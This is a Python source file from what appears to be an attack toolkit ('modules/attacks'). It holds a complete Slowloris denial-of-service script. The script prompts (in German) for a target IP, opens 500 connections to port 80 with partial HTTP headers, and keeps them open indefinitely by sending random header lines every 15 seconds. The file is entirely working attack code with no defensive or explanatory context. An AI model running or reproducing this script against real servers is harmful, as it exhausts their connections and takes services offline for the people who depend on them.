# modules/attacks/slowloris.py
import socket
import random
import time

def slowloris():
    target = input("🎯 Ziel-IP: ")
    port = 80
    sockets = []

    def create_socket():
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.send(f"GET /?{random.randint(0, 9999)} HTTP/1.1\r\n".encode())
        s.send(f"Host: {target}\r\n".encode())
        s.send("User-Agent: Mozilla/5.0\r\n".encode())
        s.send("Content-Length: 42\r\n".encode())
        return s

    for _ in range(500):  # Verbindungen aufbauen
        try:
            s = create_socket()
            sockets.append(s)
        except:
            break

    while True:
        for s in sockets:
            try:
                s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
            except:
                sockets.remove(s)
        time.sleep(15)
